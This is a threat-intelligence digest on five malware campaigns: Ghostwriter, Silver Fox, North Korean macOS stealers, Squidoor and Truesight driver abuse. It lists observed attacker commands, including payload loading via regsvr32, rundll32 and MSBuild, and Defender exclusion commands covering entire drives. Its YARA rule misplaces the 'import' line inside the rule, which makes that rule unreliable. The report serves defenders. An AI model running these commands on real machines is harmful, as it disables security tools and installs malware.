## Ghostwriter | New Campaign Targets Ukrainian Government and Belarusian Opposition
### Summary
The Ghostwriter campaign, linked to the Belarusian government, has been actively targeting Ukrainian government and military organizations, as well as the Belarusian opposition since July-August 2024. The attackers employ weaponized Excel documents to deliver malware, using tactics that blend information manipulation with hacking. The campaign uses lures related to the interests of the Ukrainian government and military, as well as the Belarusian opposition. The threat actor leverages obfuscation techniques and adapts previously observed payloads like PicassoLoader. This campaign aims to compromise targets aligned with the interests of Belarus and Russia, conducting cyberespionage operations against Ukrainian targets and aggressively pursuing the Belarusian opposition.

### Technical Details

![alt text](<images/The Feed 2025-02-28_2.jpg>)
The attack begins with a Google Drive shared document that leads to a RAR archive containing a malicious Excel workbook. When the user opens the Excel document and enables macros, an obfuscated VBA macro is executed. This macro writes a file to `%Temp%\Realtek(r)Audio.dll`. The DLL file is loaded using `regsvr32.exe`, which calls the `DllUnregisterServer` function to execute a .NET assembly. The .NET assembly, protected with ConfuserEx, is a variant of PicassoDownloader.

The Downloader creates a copy of itself in memory and modifies it, altering its PE header to evade security products. It decrypts additional code and breaks internal links to the .NET assembly. The malware writes a decoy Excel workbook to `%AppData%\Roaming\Microsoft\temp.xlsx` and opens it to deceive the victim. It then attempts to download additional files from a URL, such as `https://everythingandthedog[.]shop/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.jpg`. The downloaded file, initially a benign JPEG, is renamed and saved to `%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll`. A registry entry is created to load the DLL during autostart: `HKCU\System\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Certificate Center`. The value points to: `rundll32.exe C:\Users\\AppData\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll,#1`.

*   **Weaponized XLS 2, 3, 4 & 5**: These variants use a similar attack chain but employ the Macropack obfuscator for the VBA macro. After macro execution, a .NET ConfuserEx-obfuscated Downloader DLL is written to `%AppData%\Roaming\Microsoft\bruhdll32.dll` and loaded with `rundll32.exe`. A decoy XLS file is dropped and opened. The malware downloads a JPG file from a .shop domain, such as `https://sciencealert[.]shop/images/2024/11/black-hole-coronaxx.jpg` or `https://pigglywigglystores[.]shop/wp-content/themes/fp-wp-j-piggly-wiggly-nc/resources/images/logo/logo.png`. The downloaded file is expected to be a GZIP archive, which is decompressed and saved to `%APPDATA%\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll`. A config file is created at `%APPDATA%\Roaming\Microsoft\SystemCertificates\config`. `MSBuild.exe` is used to build a new application from the config file, producing an executable at `%AppData%\Roaming\Microsoft\SystemCertificates\Bin\Certificate.exe`.

    *   **Weaponized XLS 4 & 5** also contain an embedded .NET DLL (LibCMD.dll), which starts `cmd.exe` and connects to stdin/stdout. This DLL is loaded dynamically in memory.

Observed commands:
*   `C:\Windows\System32\regsvr32.exe /u /s "C:\Temp\Realtek(r)Audio.dll”`
*   `rundll32.exe C:\Users\\AppData\Roaming\Microsoft\SystemCertificates\CertificateCenter.dll,#1`
*   `C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %AppData%\Roaming\Microsoft\SystemCertificates\config`

## Healthcare Malware Hunt, Part 1: Philips DICOM Viewers
### Summary
A China-based APT group named **Silver Fox** is actively targeting the healthcare sector by exploiting **Philips DICOM viewers** to deploy a range of malware, including a **backdoor** (ValleyRAT), a **keylogger**, and a **crypto miner** on victim computers. This campaign demonstrates the group's evolving tactics, techniques, and procedures (TTPs), as it shifts its focus to new regions and sectors, with the malware disguised as legitimate software. The malware incorporates sophisticated evasion and obfuscation techniques to avoid detection.

### Technical Details
![alt text](<images/The Feed 2025-02-28_3.png>)
The attack involves trojanized versions of **MediaViewerLauncher.exe**, the primary executable for the Philips DICOM viewer. These malicious samples function as first-stage payloads and may be delivered through multiple vectors, potentially including SEO poisoning and phishing. The first-stage malware performs beaconing and reconnaissance, checking if the system can reach the C2 server using native Windows utilities such as ping.exe, find.exe, cmd.exe, and ipconfig.exe. It employs PowerShell commands to exclude certain paths from Windows Defender scanning.

The malware downloads encrypted payloads disguised as image files from an Alibaba Cloud bucket, decrypts them, and generates a malicious executable (second-stage malware) registered as a Windows scheduled task for persistence. The second-stage malware loads a Cyren AV DLL containing injected code to evade debugging and terminates security software using TrueSightKiller. After disabling security defenses, the malware downloads and decrypts additional payloads, deploying the ValleyRAT backdoor, a keylogger, and a crypto miner, all of which achieve persistence through scheduled tasks.

The malware uses several techniques to evade detection and analysis:
*   API hashing to conceal function calls
*   Indirect API retrieval to avoid static analysis
*   Indirect control flow manipulation to hinder debugging and reverse engineering
*   Long sleep intervals to delay execution and evade sandbox detection
*   System fingerprinting to tailor execution based on the target environment
*   Masked DLL loading to avoid security monitoring
*   RPC-based task scheduling and driver loading to bypass standard process monitoring
*   Adding random bytes to both dropped and loaded files

Observed commands:

*   `Add-MpPreference -ExclusionPath 'C:\ProgramData','C:\Users\Public' -Force`
*   `Add-MpPreference -ExclusionPath 'C:\','C:\ProgramData','C:\Users','C:\Program Files (x86)' -Force`

### Countries
*   United States
*   Canada

### Industries
*   Healthcare

### Recommendations
Healthcare Delivery Organizations (HDOs) should implement the following risk mitigation measures:

*   Avoid downloading software or files from untrusted sources.
*   Prohibit loading of files from patient devices onto healthcare workstations or other network-connected equipment.
*   Implement strong network segmentation to isolate untrusted devices and networks (e.g., guest Wi-Fi) from internal hospital infrastructure.
*   Ensure all endpoints are protected with up-to-date antivirus or EDR solutions.
*   Continuously monitor all network traffic and endpoint telemetry for suspicious activity.
*   Proactively hunt for malicious activity that aligns with known threat actor behavior, ensuring early detection and response.

### Hunting methods
*   Monitor network traffic and endpoint telemetry for suspicious activity.
*   Proactively hunt for malicious activity that aligns with known threat actor behavior.
*   File names: MediaViewerLauncher.exe, emedhtml.exe, x64DrvFx.exe

## RustDoor and Koi Stealer for macOS Used by North Korea-Linked Threat Actor to Target the Cryptocurrency Sector
### Summary
A **North Korean** linked threat actor is targeting the **cryptocurrency sector** using macOS malware. The attackers employ social engineering techniques, posing as recruiters or employers to trick job seekers into installing malware. The malware includes **RustDoor**, which is disguised as a legitimate software update and a new macOS variant of **Koi Stealer**. The attackers use sophisticated evasion techniques, manipulating macOS components to remain undetected. Palo Alto Networks customers are protected against these threats through various products and services.

### Technical Details
The infection vector involves attackers posing as recruiters and enticing job seekers to install malware disguised as development software. This campaign, named CL-STA-240 or Contagious Interview, uses tactics, techniques, and procedures (TTPs) that are similar to previous campaigns. The attackers attempt to execute multiple malware variants, redeploying them to evade detection.

The attack consists of three stages:
*   Attempting to execute two **RustDoor** variants
*   Trying another **RustDoor** variant and attempting a reverse shell
*   Running a previously undocumented macOS **Koi Stealer** variant

![alt text](<images/The Feed 2025-02-28_4.png>)

**RustDoor** is downloaded and executed from a fake job interview project within Visual Studio. The malware steals sensitive data, such as passwords from the LastPass Google Chrome extension, exfiltrates data to a command and control (C2) server, and downloads bash scripts to open a reverse shell connection with the attackers. Cortex XDR blocked attempts at reverse shell execution to a C2 server at 31.41.244[.]92 over TCP port 443. This IP address has a history of malicious use and was previously associated with RedLine Stealer.

The previously undocumented macOS variant of **Koi Stealer** masquerades as a Visual Studio update, prompting the user to install it with administrator access. **Koi Stealer** retrieves sensitive data from compromised devices in two phases and sends it to the C2 server. The macOS variant steals cryptocurrency wallets.

![alt text](<images/The Feed 2025-02-28_5.png>)

**Koi Stealer's main capabilities:**
*   Data collection and exfiltration in two stages
    *   Collects reconnaissance information, such as hardware UUID and user information
    *   Requests the user's root password
    *   Builds an HTTP request that exfiltrates usernames, passwords, hostnames, build information, hardware details, process lists, and installed applications
    *   Copies browser files, Filezilla files, OpenVPN profile files, Steam user and configuration files, cryptocurrency wallets, Discord users and configuration files, Telegram data files, zsh history, SSH configuration files, keychain files, notes, and Safari files
*   Uses **AppleScript** to mute the system's volume, concealing commands that copy multiple files
    *   Uses AppleScript to collect and copy specific files from the ~/Desktop and ~/Documents directories, filtered by selected extensions
*   Employs string encryption to hide its code

Both macOS and Windows variants share similar code structures, execution flows, and interests in sensitive data. They use similar string formats for C2 server communication and send memory streams of data to avoid detection.

The attackers used the RustDoor backdoor, which Sentinel One previously attributed to Alluring Pisces (aka BlueNoroff, Sapphire Sleet). The domain apple-ads-metric[.]com hosts both RustDoor and the macOS variant of Koi Stealer. The victims were software developers in the cryptocurrency industry.

## Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations
### Summary
A suspected **Chinese threat actor**, identified as CL-STA-0049, has been targeting governments, defense, telecommunications, education, and aviation sectors in Southeast Asia and South America since at least March 2023. The actor's objectives include collecting sensitive information and intelligence on high-ranking officials within compromised organizations. The threat actor uses a sophisticated backdoor named **Squidoor** (aka FinalDraft) that targets both Windows and Linux systems. This backdoor is designed for stealth and uses multiple protocols for command and control (C2) communication, including Outlook API, DNS tunneling, and ICMP tunneling.

### Technical Details
The threat actor gains initial access to networks by exploiting vulnerabilities in Internet Information Services (IIS) servers and deploying multiple web shells on infected servers. These web shells act as persistent backdoors, allowing the actor to maintain access and execute commands.

Observed web shells include:

*   OutlookDC.aspx
*   Error.aspx (1)
*   Error.aspx (2)
*   TimeoutAPI.aspx

The web shells share characteristics such as embedded decryption keys, extensive obfuscation, consistent string patterns, and code structures. The threat actor stores some web shells on bashupload[.]com and downloads/decodes them using certutil. Lateral movement involves spreading web shells across different servers using curl and Impacket. One technique involves concealing a web shell as a certificate and copying it to other servers using Windows Management Instrumentation (WMI).

**Squidoor** is a modular, multi-platform backdoor built for stealth, with versions for both Windows and Linux. It is used to maintain access, move laterally, create stealthy communication channels, and collect sensitive information. The Windows version has 10 different methods for C2 communication, while the Linux version has nine. Some methods are for external communication, while others are for internal communication within a compromised network.

**Squidoor's Capabilities**:

*   Collect information about the infected machine
*   Execute arbitrary commands
*   Inject payloads into selected processes
*   Deliver additional payloads
*   Host reconnaissance and fingerprinting, including username, privileges, hostname, IP address, and OS type
*   Query files and directories
*   Query running processes
*   Exfiltrate files
*   Deploy additional malware
*   Send commands to other Squidoor implants via TCP and named pipes

To execute Squidoor, the threat actor abuses the Microsoft Console Debugger binary named cdb.exe, delivering it to infected environments, saving it as C:\\ProgramData\\fontdrvhost.exe, and using it to load and execute shellcode in memory. After the first execution, one of Squidoor’s payloads (LoadShellcode.x64.dll, loaded into mspaint.exe) loads and decrypts another Squidoor implant from a file named wmsetup.log. Persistence is achieved using a scheduled task named Microsoft\\Windows\\AppID\\EPolicyManager.

The execution flow involves decrypting a hard-coded configuration containing a single digit (0-9) that determines the communication method. The configuration may also include domains, IP addresses, listening ports, encryption keys, and access tokens.

**Squidoor C2 Communication Methods:**

*   0: HTTP-based communication
*   1: Reverse TCP connection to a remote server
*   2: Reverse UDP connection to a remote server
*   3: Listen for incoming TCP connections (internal communication only)
*   4: Listen for incoming HTTP connections (HTTP Server)
*   5: Communicate via an Outlook mail API
*   6: Utilize ICMP tunneling for communication
*   7: Utilize DNS tunneling for communication
*   8: Communicate via a mail client retrieved from the configuration file
*   9: Use named pipes for communication (internal communication, Windows only)

When using the COutLookTransChannel configuration, Squidoor logs in to the Microsoft identity platform using a hard-coded refresh token. It sends an HTTP GET request to a specific Pastebin page named Local365 to track implants connected via the Outlook API. Squidoor uses the Outlook REST API to query the drafts folder, searching for emails with a subject containing the string p_{random\_generated\_number}. If not found, Squidoor sends an email to the attackers with the generated string as the subject, including Base64-encoded content. The attackers use the {random\_generated\_number} identifier to differentiate between Squidoor implants querying commands from the same Outlook mail inbox.

To perform code injection, Squidoor uses classic DLL injection, calling Windows API functions RtlCreateUserThread, VirtualAllocEx, and WriteProcessMemory. The Windows version can inject code into mspaint.exe (or conhost.exe in Windows 11) or an already running process determined by a process ID (PID). Additional modules are injected into processes like mspaint.exe, conhost.exe, taskhostw.exe, and vmtoolsd.exe to move laterally, steal data, and execute commands on remote endpoints. These modules require a password to evade dynamic analysis and sandboxes.

The threat actor abuses Pastebin to store components related to the different communication methods of the malware such as access tokens and API keys.

Observed commands and techniques:

*   Abuse of Microsoft Console Debugger binary cdb.exe (renamed to fontdrvhost.exe) to load shellcode
*   Use of scheduled tasks for persistence
*   Use of HTTP GET requests to Pastebin to track implants
*   Classic DLL injection using Windows API functions
*   Use of steganography to hide malicious code
*   Use of PowerShell to perform actions on remote systems
*   Use of WinRM for lateral movement

### Countries
*   Southeast Asia
*   South America

### Industries
*   Governments
*   Defense
*   Telecommunication
*   Education
*   Aviation

### Recommendations
Security practitioners and defenders should study the report and use the information to enhance current detection, prevention, and hunting practices to strengthen their security posture.

### Hunting methods
Palo Alto Networks customers can leverage the following for protection:

*   Advanced WildFire for machine-learning-based detection
*   Advanced URL Filtering to identify malicious domains
*   Next-Generation Firewall with Advanced Threat Prevention
*   Cortex XDR and XSIAM for preventing execution of known and unknown malware, protecting against exploitation, detecting post-exploit activity, and protecting from web shells

## Silent Killers: Unmasking a Large-Scale Legacy Driver Exploitation Campaign - Check Point Research
### Summary

CPR (Check Point Research) has uncovered a large-scale, ongoing campaign involving thousands of malicious samples that deploy an EDR/AV killer module. This campaign, detected first in June 2024, exploits a known vulnerability in the legacy version 2.0.2 of the **Truesight.sys driver** (RogueKiller Antirootkit Driver, part of Adlice’s product suite). The attackers exploit this driver version to bypass Windows security measures and disable security solutions. They generated over 2,500 distinct variants of the driver by modifying specific PE parts while keeping the signature valid, allowing them to evade detection. The attackers operate from infrastructure in a public cloud’s China region, with approximately 75% of victims located in China and the remainder in other parts of Asia. The initial-stage samples act as downloaders/loaders, often disguised as well-known applications, and are distributed via phishing methods. These samples deliver final-stage payloads, such as Gh0st RAT variants, after preparing the infected machine. CPR reported this issue to MSRC, leading to an updated version of the Microsoft Vulnerable Driver Blocklist on December 17, 2024, which effectively blocks all variants of the exploited legacy driver.

### Technical Details

The attackers are exploiting the legacy version 2.0.2 of the Truesight driver to take advantage of a loophole in Windows Driver Signing Policy, which allows the driver to be loaded on the latest Windows OS versions. This specific version was chosen because it retains the vulnerable code while bypassing the Microsoft Vulnerable Driver Blocklist and common detection mechanisms. The vulnerability exploited is Arbitrary Process Termination.

The attackers generate multiple variants of the 2.0.2 driver by modifying specific PE parts, such as the PE header checksum and padding in the WIN_CERTIFICATE structure, while keeping the digital signature valid. This results in different file hashes, evading hash-based detection.

**Infection Chain**:

*   **Stage 1**: Initial-stage samples act as downloaders, disguising themselves as legitimate applications and distributed via phishing. They download Stage2, encrypted payloads, and the Truesight driver version 2.0.2.
*   **Stage 2**: Loads encrypted payloads and downloads Stage3 along with its encrypted payloads.
*   **Stage 3**: Loads encrypted payloads, deploys the EDR/AV killer module in-memory, downloads and executes the final stage (Gh0st RAT), and connects to the C2 server.

Stages 2 and 3 achieve persistence via scheduled tasks that abuse DLL side-loading. The malicious payloads are often encrypted to resemble common file types and protected using VMProtect to complicate analysis. The EDR/AV killer module abuses the Truesight driver to terminate processes related to security solutions by sending the IOCTL 0x22E044.

The Truesight driver is installed as a service named TCLService. If the driver is not present, the EDR/AV killer module downloads it from a public cloud.

The final stage payload is a variant of the Gh0st RAT, which allows for remote control of compromised computers, data theft, surveillance, and system manipulation. This variant shares similarities with the HiddenGh0st RAT.

Observed commands and techniques:

*   Leveraging a known vulnerability in the Truesight driver for arbitrary process termination.
*   Modifying PE parts (checksum and padding) to generate driver variants and evade hash-based detection.
*   Taking advantage of a Windows policy loophole that permits loading drivers signed before July 29, 2015.
*   Bypassing the Microsoft Vulnerable Driver Blocklist by using a driver version not explicitly blocked.
*   Using phishing methods, including deceptive websites and messaging app channels, for initial distribution.
*   Disguising initial-stage samples as legitimate applications.
*   Using DLL side-loading for persistence.
*   Encrypting payloads and using VMProtect to hinder analysis.
*   Downloading payloads from public cloud infrastructure in China.
*   Employing an EDR/AV killer module to disable security solutions.
*   Using Gh0st RAT as the final-stage payload for remote access and control.

### Countries

*   China (75% of victims)
*   Singapore
*   Taiwan
*   Asia (other parts)

### Industries

*   Likely wide-ranging due to broad phishing methods
*   Individuals and organizations across various sectors

### Recommendations

*   Apply the latest version of the Microsoft Vulnerable Driver Blocklist manually.
*   Implement comprehensive detection strategies beyond hash-based detection.
*   Use research-driven, future-focused detection rules to uncover hidden threats.
*   Leverage solutions like Check Point Threat Emulation and Harmony Endpoint for comprehensive coverage.

### Hunting methods

*   Develop future-focused hunting rules to detect potential abuse of not-yet-known vulnerable drivers.
*   YARA rule to detect variants of the legacy Truesight driver (version 2.0.2).

**YARA Rule:**
```
rule truesight_driver_64bit_ver202
{
meta:
description = "Detects all variants of the legacy, 64-bit, valid-signed Truesight driver, version 2.0.2"
author = "Jiri Vinopal @ Check Point Research"
condition:
// Detect PE
uint16(0) == 0x5a4d and uint16(uint32(0x3c)) == 0x4550 and
// Detect 64-bit Windows drivers
uint16(uint32(0x3C) + 0x5c) == 0x0001 and uint16(uint32(0x3C) + 0x18) == 0x020b and
// Detect InternalName "Truesight" and FileVersion "2.0.2"
pe.version_info["InternalName"] == "Truesight" and pe.version_info["FileVersion"] == "2.0.2" and
// Detect only signed drivers, not a real verification
pe.number_of_signatures > 0 and for all i in (0..pe.number_of_signatures -1):
(pe.signatures[i].verified)
import "pe"
}
```

*   Behavioral analysis to identify sideloading attempts.
